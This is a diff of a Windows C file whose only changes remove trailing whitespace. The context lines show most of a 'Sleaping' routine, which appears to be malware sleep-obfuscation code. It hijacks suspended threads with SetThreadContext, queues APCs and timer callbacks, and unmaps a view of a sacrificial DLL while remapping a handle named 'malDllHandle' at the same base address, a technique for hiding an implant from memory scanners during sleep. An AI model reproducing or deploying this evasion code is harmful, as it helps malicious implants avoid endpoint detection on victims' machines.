@@ -8,9 +8,9 @@
 
 int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize, PNT_FUNCTIONS ntFunctions, PVOID NtTestAlertAddress) {
 
-    
+
     HANDLE DummyEvent = { 0 };
-    
+
     //sleaping threads = 5 Timers + 6 APC threads
     HANDLE ThreadArray[4] = { NULL };
 
@@ -18,13 +18,13 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
     HANDLE  hTimerQueue = NULL;
     HANDLE  hNewTimer = NULL;
 
-    //i create the sync event that would trigger the first thread 
+    //i create the sync event that would trigger the first thread
 
     if (!NT_SUCCESS(ntFunctions->NtCreateEvent(&DummyEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
         return -1;
     }
 
-	
+
     //variables and logic for SLEAPING timers
     CONTEXT* context = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
     CONTEXT* contextB = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
@@ -40,7 +40,7 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
     contextB->ContextFlags = CONTEXT_ALL;
     contextC->ContextFlags = CONTEXT_ALL;
     contextD->ContextFlags = CONTEXT_ALL;
-    
+
     ThreadArray[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WaitForSingleObjectEx, NULL, CREATE_SUSPENDED, NULL);
     if (ThreadArray[2] == NULL) {
 
@@ -59,8 +59,8 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
 
     if (!SetThreadContext(ThreadArray[2], contextC)) {
         return -1;
-    }//wait + APCs 
-    //resume the thread that is going to wait the sleep time and then execute the APCs 
+    }//wait + APCs
+    //resume the thread that is going to wait the sleep time and then execute the APCs
     if (!ResumeThread(ThreadArray[2])) {
         return -1;
     }
@@ -91,7 +91,7 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
 	if(!GetThreadContext(ThreadArray[3], contextD))
 		return -1;
 
-     
+
     //timer triggered
     *(ULONG_PTR*)((*context).Rsp) = (DWORD64)ExitThread;
     (*context).Rip = (DWORD64)UnmapViewOfFile;
@@ -106,7 +106,7 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
     *(ULONG_PTR*)((*contextB).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
     *(ULONG_PTR*)((*contextB).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;
 
-    //apc triggered 
+    //apc triggered
     *(ULONG_PTR*)((*contextD).Rsp) = (DWORD64)ExitThread;
     (*contextD).Rip = (DWORD64)MapViewOfFileEx;
     (*contextD).Rcx = (DWORD64)malDllHandle;
@@ -123,7 +123,7 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
 	if (!SetThreadContext(ThreadArray[3], contextD))
 		return -1;
 
-    
+
     //create the timer queue
     hTimerQueue = CreateTimerQueue();
     if (hTimerQueue == NULL) {
@@ -131,7 +131,7 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
     }
 
     //queue the APC threads to the worker thread
-    
+
     if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(ThreadArray[2], (PPS_APC_ROUTINE)UnmapViewOfFile, ImageBaseDLL, FALSE, NULL))) {
             return -1;
     }
@@ -143,19 +143,19 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
     if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(ThreadArray[2], (PPS_APC_ROUTINE)ExitThread, NULL, FALSE, NULL))) {
         return -1;
     }
-    
-	
+
+
 
     if (!CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[0], 200, 0, WT_EXECUTEINTIMERTHREAD)) {
 		return -1;
 	}//unmap
-    
+
 	if (!CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[1], 300, 0, WT_EXECUTEINTIMERTHREAD)) {
 		return -1;
 	}//mapex
-		
-    
-	
+
+
+
 	//wait for all the threads to finish
     if (WaitForMultipleObjects(4, ThreadArray, TRUE, INFINITE) == WAIT_FAILED) {
         return -1;
